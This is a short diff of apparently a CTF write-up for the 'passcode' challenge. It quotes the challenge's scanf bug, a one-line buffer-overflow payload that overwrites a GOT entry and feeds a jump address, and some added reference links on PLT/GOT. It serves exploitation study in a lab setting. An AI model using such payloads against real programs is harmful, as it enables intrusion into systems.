@@ -30,3 +30,11 @@ scanf("%d", passcode1);<becoz %d so input a integer
 
 
 payload= python -c "print 'A'*96+'\x00\xa0\x04\x08\n'+'134514147\n'" | ./passcode
+
+
+Reference:
+http://blog.csdn.net/qq_20307987/article/details/51303824
+
+http://brandon-hy-lin.blogspot.hk/2015/12/shared-library-plt-got.html
+
+https://gist.github.com/ihciah/0ca68da3e32e38818bb9
